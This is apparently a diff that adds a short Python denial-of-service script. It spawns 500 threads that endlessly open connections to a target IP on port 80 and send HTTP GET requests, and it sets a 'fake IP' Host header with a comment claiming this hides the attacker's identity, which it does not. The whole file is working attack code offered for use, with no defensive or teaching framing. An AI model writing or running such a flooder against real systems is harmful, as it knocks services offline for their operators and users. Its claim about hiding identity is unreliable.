@@ -1,0 +1,20 @@
+import socket
+import threading
+
+# Target IP and port
+target = '192.168.1.1'  # Replace with the target IP
+port = 80  # Common HTTP port
+fake_ip = '182.21.20.32'  # Fake IP to hide identity
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+# Creating multiple threads to simulate multiple requests
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
